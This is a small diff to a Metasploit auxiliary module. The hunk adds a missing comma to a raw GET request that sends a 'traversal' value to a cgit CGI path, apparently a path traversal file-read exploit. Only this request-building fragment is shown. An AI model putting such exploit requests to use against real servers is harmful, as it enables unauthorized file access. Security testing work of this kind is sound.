@@ -45,7 +45,7 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_raw({
       'method' => 'GET',
-      'uri'    => '/cgit/cgit.cgi/git/objects/?path='
+      'uri'    => '/cgit/cgit.cgi/git/objects/?path=',
       'vars_get' => {
         'UID' => traversal
       }
